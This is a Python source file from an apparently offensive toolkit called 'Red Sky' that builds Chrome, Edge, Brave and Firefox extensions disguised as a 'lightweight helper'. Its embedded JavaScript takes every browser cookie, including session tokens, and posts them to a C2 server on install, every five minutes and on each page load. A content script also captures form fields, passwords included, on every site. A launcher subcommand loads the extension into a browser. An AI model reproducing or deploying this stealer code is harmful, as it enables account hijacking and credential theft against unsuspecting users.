# language: Python, file: Program/browser/extensions.py, target: Red Sky browser — extension generator
# Builds unpacked browser extensions for Chromium (Chrome / Edge / Brave) and
# Firefox. Subcommands:
#   chromium -- MV2 or MV3 extension; manifests with cookies/webRequest/tabs
#   firefox  -- MV2 XPI with browser_specific_settings
#   launch   -- start Chrome/Edge with --load-extension and a fresh profile
#   verify   -- parse the generated manifest to confirm required permissions
# The generated extension exfils cookies (session tokens) to a C2 on install and
# on every tab navigation. A content script hooks login forms.

import argparse
import json
import os
import shutil
import subprocess
import sys
import time
from pathlib import Path
from typing import Dict, List, Optional

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


BROWSER_DIR = OUTPUT_DIR / "browser"
EXT_DIR = BROWSER_DIR / "extensions"
EXT_DIR.mkdir(parents=True, exist_ok=True)


# ── chromium MV3 manifest ──
CHROMIUM_MV3_MANIFEST = {
    "manifest_version": 3,
    "name": "{name}",
    "version": "1.0.0",
    "description": "{description}",
    "permissions": [
        "cookies",
        "storage",
        "tabs",
        "scripting",
        "activeTab",
        "alarms"
    ],
    "host_permissions": ["<all_urls>"],
    "background": {
        "service_worker": "background.js"
    },
    "content_scripts": [
        {
            "matches": ["<all_urls>"],
            "js": ["content.js"],
            "run_at": "document_idle",
            "all_frames": True
        }
    ],
    "action": {
        "default_title": "{name}"
    },
    "icons": {
        "16": "icon16.png",
        "48": "icon48.png",
        "128": "icon128.png"
    }
}


# ── chromium MV2 manifest ──
CHROMIUM_MV2_MANIFEST = {
    "manifest_version": 2,
    "name": "{name}",
    "version": "1.0.0",
    "description": "{description}",
    "permissions": [
        "cookies",
        "storage",
        "tabs",
        "webRequest",
        "webRequestBlocking",
        "<all_urls>"
    ],
    "background": {
        "scripts": ["background.js"],
        "persistent": True
    },
    "content_scripts": [
        {
            "matches": ["<all_urls>"],
            "js": ["content.js"],
            "run_at": "document_idle",
            "all_frames": True
        }
    ],
    "browser_action": {
        "default_title": "{name}"
    },
    "icons": {
        "16": "icon16.png",
        "48": "icon48.png",
        "128": "icon128.png"
    }
}


# ── firefox MV2 manifest ──
FIREFOX_MANIFEST = {
    "manifest_version": 2,
    "name": "{name}",
    "version": "1.0.0",
    "description": "{description}",
    "permissions": [
        "cookies",
        "storage",
        "tabs",
        "webRequest",
        "webRequestBlocking",
        "<all_urls>"
    ],
    "background": {
        "scripts": ["background.js"]
    },
    "content_scripts": [
        {
            "matches": ["<all_urls>"],
            "js": ["content.js"],
            "run_at": "document_idle",
            "all_frames": True
        }
    ],
    "browser_action": {
        "default_title": "{name}"
    },
    "browser_specific_settings": {
        "gecko": {
            "id": "{gecko_id}",
            "strict_min_version": "78.0"
        }
    },
    "icons": {
        "48": "icon48.png",
        "96": "icon96.png"
    }
}


# ── shared background.js ──
BACKGROUND_JS = r'''// Red Sky extension — background
// Fires on install + every 5 minutes via alarms (MV3) or setInterval (MV2).
// Collects cookies for all domains and POSTs them to the C2.
const C2 = "{c2_url}";
const SHARED_SECRET = "{secret}";

async function exfilCookies() {
  try {
    const cookies = await chrome.cookies.getAll({{}});
    const payload = {{
      ts: Date.now(),
      secret: SHARED_SECRET,
      host: location.host || "background",
      cookies: cookies.map(c => ({{
        name: c.name, value: c.value, domain: c.domain,
        path: c.path, secure: c.secure, httpOnly: c.httpOnly,
        sameSite: c.sameSite, expirationDate: c.expirationDate
      }}))
    }};
    await fetch(C2, {{
      method: "POST",
      headers: {{ "Content-Type": "application/json" }},
      body: JSON.stringify(payload)
    }});
  }} catch (e) {{
    // swallow
  }}
}}

// MV3 service workers wake on alarm
if (typeof chrome !== "undefined" && chrome.alarms) {{
  chrome.alarms.create("exfil", {{ periodInMinutes: 5 }});
  chrome.alarms.onAlarm.addListener((a) => {{ if (a.name === "exfil") exfilCookies(); }});
}}

// MV2 background page — setInterval works directly
if (typeof chrome !== "undefined" && chrome.tabs) {{
  setInterval(exfilCookies, 5 * 60 * 1000);
  chrome.tabs.onUpdated.addListener((id, info, tab) => {{
    if (info.status === "complete") exfilCookies();
  }});
}}

// initial burst on install
if (typeof chrome !== "undefined" && chrome.runtime) {{
  chrome.runtime.onInstalled.addListener(exfilCookies);
}}

// kick immediately when the service worker wakes
exfilCookies();
'''


# ── shared content.js ──
CONTENT_JS = r'''// Red Sky extension — content script
// Watches for form submissions on any page and posts the field values back
// to the background script via chrome.runtime.sendMessage.
(function () {
  const C2 = "{c2_url}";
  const SHARED_SECRET = "{secret}";

  function report(fields) {
    try {
      fetch(C2, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          ts: Date.now(),
          secret: SHARED_SECRET,
          url: location.href,
          referrer: document.referrer,
          title: document.title,
          fields: fields
        })
      });
    } catch (e) {}
  }

  function snapshot(form) {
    const out = {};
    const inputs = form.querySelectorAll("input, textarea, select");
    for (const el of inputs) {
      const key = el.name || el.id || el.type || ("field_" + Math.random());
      let val = el.value;
      if (el.type === "password") val = "[password] " + val;
      out[key] = val;
    }
    return out;
  }

  document.addEventListener("submit", (ev) => {
    try {
      const f = ev.target;
      if (f && f.tagName === "FORM") report(snapshot(f));
    } catch (e) {}
  }, true);

  // Also snapshot after the page settles, in case the login form uses fetch()
  setTimeout(() => {
    const forms = document.querySelectorAll("form");
    if (forms.length) {
      const merged = {};
      for (const f of forms) Object.assign(merged, snapshot(f));
      report({ _autoscan: true, ...merged });
    }
  }, 4000);
})();
'''


def _write_icon(path: Path, size: int) -> None:
    """Write a minimal 1-color PNG placeholder at the given size."""
    # A 1x1 PNG scaled is enough for the browser to accept the manifest
    import struct, zlib
    def _png_chunk(t, d):
        chunk = t + d
        return struct.pack(">I", len(d)) + chunk + struct.pack(">I", zlib.crc32(chunk) & 0xFFFFFFFF)
    sig = b"\x89PNG\r\n\x1a\n"
    ihdr = struct.pack(">IIBBBBB", size, size, 8, 6, 0, 0, 0)  # 8-bit RGBA
    # solid dark red pixel row
    row = b"\x00" + (bytes([0x8B, 0x00, 0x00, 0xFF]) * size)
    raw = b"\x00" + b"".join(row[1:] for _ in range(size))  # filter byte per row
    idat = zlib.compress(raw)
    data = sig + _png_chunk(b"IHDR", ihdr) + _png_chunk(b"IDAT", idat) + _png_chunk(b"IEND", b"")
    path.write_bytes(data)


def _write_common(out_dir: Path, c2_url: str, secret: str, icons: List[int]) -> None:
    (out_dir / "background.js").write_text(BACKGROUND_JS.replace("{c2_url}", c2_url).replace("{secret}", secret))
    (out_dir / "content.js").write_text(CONTENT_JS.replace("{c2_url}", c2_url).replace("{secret}", secret))
    for size in icons:
        _write_icon(out_dir / ("icon%d.png" % size), size)


def cmd_chromium(name: str, c2_url: str, secret: str, mv: int, out_dir: str) -> int:
    if not c2_url:
        print_err("--c2 required")
        return 2
    name = name or "Helper"
    secret = secret or "rs-" + str(int(time.time()))

    target = Path(out_dir) if out_dir else EXT_DIR / (name.lower().replace(" ", "_") + "_crx")
    target.mkdir(parents=True, exist_ok=True)

    tmpl = CHROMIUM_MV3_MANIFEST if mv == 3 else CHROMIUM_MV2_MANIFEST
    manifest = json.loads(json.dumps(tmpl))  # deep copy
    manifest["name"] = name
    manifest["description"] = name + " — lightweight helper"
    (target / "manifest.json").write_text(json.dumps(manifest, indent=2))

    _write_common(target, c2_url, secret, [16, 48, 128])

    print_ok("extension written to " + str(target))
    print_kv("manifest", "MV" + str(mv))
    print_kv("c2", c2_url)
    print_kv("secret", secret)
    print()
    print_info("load in Chrome / Edge:")
    print("  1. chrome://extensions -> Developer mode -> Load unpacked -> " + str(target))
    print("  2. confirm the extension appears, wait for the exfil burst")
    print()
    print_info("or launch a fresh profile with the extension auto-loaded:")
    print_info("  redsky browser extensions launch --browser chrome --ext " + str(target))
    return 0


def cmd_firefox(name: str, c2_url: str, secret: str, gecko_id: str, out_dir: str) -> int:
    if not c2_url:
        print_err("--c2 required")
        return 2
    name = name or "Helper"
    secret = secret or "rs-" + str(int(time.time()))
    gecko_id = gecko_id or ("helper@" + "rs-" + str(int(time.time())))

    target = Path(out_dir) if out_dir else EXT_DIR / (name.lower().replace(" ", "_") + "_ff")
    target.mkdir(parents=True, exist_ok=True)

    manifest = json.loads(json.dumps(FIREFOX_MANIFEST))
    manifest["name"] = name
    manifest["description"] = name + " — lightweight helper"
    manifest["browser_specific_settings"]["gecko"]["id"] = gecko_id
    (target / "manifest.json").write_text(json.dumps(manifest, indent=2))

    _write_common(target, c2_url, secret, [48, 96])

    print_ok("firefox extension written to " + str(target))
    print_kv("gecko id", gecko_id)
    print_kv("c2", c2_url)
    print()
    print_info("load as temporary add-on:")
    print("  1. about:debugging#/runtime/this-firefox -> Load Temporary Add-on")
    print("  2. pick manifest.json")
    print_info("or pack as .xpi: cd " + str(target) + " && zip -r ../helper.xpi .")
    return 0


def cmd_launch(browser: str, ext_dir: str, url: str, headless: bool) -> int:
    if not ext_dir:
        print_err("--ext required")
        return 2
    ext = Path(ext_dir).expanduser().resolve()
    if not ext.exists():
        print_err("extension dir not found: " + str(ext))
        return 2

    browser = (browser or "chrome").lower()
    exes = {
        "chrome":       ["google-chrome", "google-chrome-stable", "chrome"],
        "chrome-linux": ["google-chrome", "google-chrome-stable"],
        "chromium":     ["chromium", "chromium-browser"],
        "edge":         ["microsoft-edge", "msedge"],
        "brave":        ["brave-browser", "brave"],
    }
    candidates = exes.get(browser, [browser])
    exe_path = None
    for c in candidates:
        p = shutil.which(c)
        if p:
            exe_path = p
            break
    if not exe_path:
        print_err("could not find browser binary: " + browser)
        print_info("candidates tried: " + ", ".join(candidates))
        return 2

    profile = EXT_DIR.parent / ("profile_" + str(int(time.time())))
    profile.mkdir(parents=True, exist_ok=True)

    cmd = [
        exe_path,
        "--user-data-dir=" + str(profile),
        "--load-extension=" + str(ext),
        "--disable-extensions-except=" + str(ext),
        "--no-first-run",
        "--no-default-browser-check",
    ]
    if headless:
        cmd += ["--headless=new"]
    if url:
        cmd.append(url)

    print_ok("launching " + exe_path)
    print_kv("profile", profile)
    print_kv("extension", ext)
    print_kv("headless", "yes" if headless else "no")
    print()
    print_info("command: " + " ".join(cmd))
    try:
        subprocess.run(cmd, check=False)
    except KeyboardInterrupt:
        print_info("browser closed")
    return 0


def cmd_verify(manifest_path: str) -> int:
    p = Path(manifest_path).expanduser()
    if p.is_dir():
        p = p / "manifest.json"
    if not p.exists():
        print_err("manifest not found: " + str(p))
        return 1
    try:
        m = json.loads(p.read_text())
    except json.JSONDecodeError as e:
        print_err("bad manifest json: " + str(e))
        return 1

    print_info("extension manifest summary")
    print_kv("name", m.get("name", ""))
    print_kv("version", m.get("version", ""))
    print_kv("manifest_version", str(m.get("manifest_version", "")))

    perms = set(m.get("permissions", []))
    host_perms = set(m.get("host_permissions", []))

    required = {"cookies", "tabs", "storage"}
    missing = required - perms - host_perms
    if not missing:
        print_ok("required permissions present")
    else:
        print_warn("missing permissions: " + ", ".join(missing))

    print()
    print_info("permissions")
    for x in sorted(perms):
        print("  " + SCARLET + "*" + RESET + " " + x)
    print_info("host_permissions")
    for x in sorted(host_perms):
        print("  " + SCARLET + "*" + RESET + " " + x)

    # scan the JS for the exfil primitive
    ext_dir = p.parent
    for fname in ("background.js", "content.js"):
        f = ext_dir / fname
        if not f.exists():
            continue
        text = f.read_text()
        has_fetch = "fetch(" in text
        has_c2 = "C2" in text
        print()
        print("  " + ARTERY + fname + RESET + "  fetch=" + ("yes" if has_fetch else "no")
              + "  c2_reference=" + ("yes" if has_c2 else "no"))
    return 0


def run_cli(args):
    p = argparse.ArgumentParser(prog="redsky browser extensions", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("action", nargs="?", default="help",
                   choices=["chromium", "firefox", "launch", "verify", "help"])
    p.add_argument("--name", default="Helper")
    p.add_argument("--c2", default="", help="C2 URL to receive cookies/creds")
    p.add_argument("--secret", default="", help="shared secret embedded in the payload")
    p.add_argument("--mv", type=int, default=3, choices=[2, 3], help="manifest version")
    p.add_argument("--gecko-id", default="", help="firefox add-on id (default: generated)")
    p.add_argument("--browser", default="chrome",
                   choices=["chrome", "chrome-linux", "chromium", "edge", "brave"])
    p.add_argument("--ext", default="", help="extension dir for launch")
    p.add_argument("--url", default="", help="optional start URL")
    p.add_argument("--headless", action="store_true")
    p.add_argument("--manifest", default="", help="path to manifest.json for verify")
    p.add_argument("--out", default="")

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky browser extensions <chromium|firefox|launch|verify> [opts]")
        return 2

    if ns.action == "help" or ns.help:
        print_info("chromium --c2 https://x/collect [--name Helper] [--mv 3|2] [--secret X]")
        print_info("firefox  --c2 https://x/collect [--name Helper] [--gecko-id helper@x]")
        print_info("launch   --browser chrome --ext Output/browser/extensions/helper_crx [--url https://...] [--headless]")
        print_info("verify   --manifest Output/browser/extensions/helper_crx/manifest.json")
        return 0

    if ns.action == "chromium":
        return cmd_chromium(ns.name, ns.c2, ns.secret, ns.mv, ns.out)
    if ns.action == "firefox":
        return cmd_firefox(ns.name, ns.c2, ns.secret, ns.gecko_id, ns.out)
    if ns.action == "launch":
        return cmd_launch(ns.browser, ns.ext, ns.url, ns.headless)
    if ns.action == "verify":
        if not ns.manifest:
            print_err("--manifest required")
            return 2
        return cmd_verify(ns.manifest)
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
